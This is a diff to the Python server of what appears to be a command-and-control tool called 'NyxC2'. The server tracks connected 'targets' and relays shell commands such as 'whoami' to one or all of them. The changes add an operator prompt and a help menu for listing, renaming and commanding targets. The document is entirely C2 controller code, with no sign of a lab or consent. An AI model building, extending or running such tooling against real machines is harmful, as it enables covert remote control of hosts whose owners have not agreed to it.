@@ -10,6 +10,7 @@ def server():
     dict_ip = {}
     print("Server is ready and listening")
     print("waiting for connection")
+    print("NyxC2 > ", end="", flush=True)
     while True:
         r_sock, w_sock, x_sock = select.select(server_list, [], [])
         for elem in r_sock:
@@ -49,13 +50,21 @@ def server():
                         case "connect":
                             target = order.strip().split(" ")[1]
                             send_message(target + " echo i'm connected", dict_ip)
+                        case "help":
+                            print("\n--- 🛠️ NyxC2 Master Commands 🛠️ ---")
+                            print("mc list               : Show all active connected targets")
+                            print("mc rename <old> <new> : Rename a target's alias/IP")
+                            print("mc connect <target>   : Test connection to a specific target")
+                            print("mc help               : Display this help menu")
+                            print("<target|*> <command>  : Send a command to target(s) (e.g., * whoami)")
+                            print("------------------------------------\n")
                     
                     
                     
                     
                 else:
                     send_message(command, dict_ip)
-                
+                print("NyxC2 > ", end="", flush=True)
             else:
                 nom_cible = "Inconnu"
                 for name, sock in dict_ip.items():
@@ -77,6 +86,7 @@ def server():
                             
                         if new_data:
                             print(f"\n[answer from {nom_cible}] :\n {new_data}")
+                            print("NyxC2 > ", end="", flush=True)
                 except ConnectionResetError:
                     print(f"connection brutally interrupted with {nom_cible}")
                     if nom_cible in dict_ip:
